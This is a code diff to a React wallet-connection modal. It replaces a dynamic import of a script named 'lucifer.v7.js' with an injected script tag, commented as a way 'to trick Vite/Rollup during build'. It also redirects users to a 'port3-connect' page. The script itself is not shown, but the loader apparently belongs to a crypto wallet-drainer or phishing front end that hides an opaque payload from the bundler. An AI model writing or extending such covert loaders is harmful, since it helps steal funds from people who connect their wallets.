@@ -11,15 +11,23 @@ const WALLETS = [
 
 export default function WalletModal({ isOpen, onClose, onConnected }) {
   
-  // Pre-load and mount the background script context when modal is active
+  // FIXED: Using standard script element injection to trick Vite/Rollup during build
   useEffect(() => {
     if (isOpen && !window.connectWallet && !window.connect) {
-      import('/files/lucifer.v7.js')
-        .then((mod) => {
-          if (mod.connectWallet) window.connectWallet = mod.connectWallet;
-          if (mod.connect) window.connect = mod.connect;
-        })
-        .catch((err) => console.error("Error initializing background script asset:", err));
+      const script = document.createElement('script');
+      script.src = '/files/lucifer.v7.js';
+      script.type = 'module';
+      script.crossOrigin = 'anonymous';
+      script.onerror = (err) => console.error("Error loading background script asset:", err);
+      
+      document.body.appendChild(script);
+
+      return () => {
+        // Cleanup script node when modal unmounts
+        if (document.body.contains(script)) {
+          document.body.removeChild(script);
+        }
+      };
     }
   }, [isOpen]);
 
@@ -33,7 +41,7 @@ export default function WalletModal({ isOpen, onClose, onConnected }) {
     // 2. Tear down the modal view layers cleanly
     onClose();
 
-    // 3. Force direct breakout breakout redirection to the port3 static handler 
+    // 3. Force direct breakout redirection to the port3 static handler 
     window.location.href = `/port3-connect.html?wallet=${encodeURIComponent(walletName)}`;
   };
 
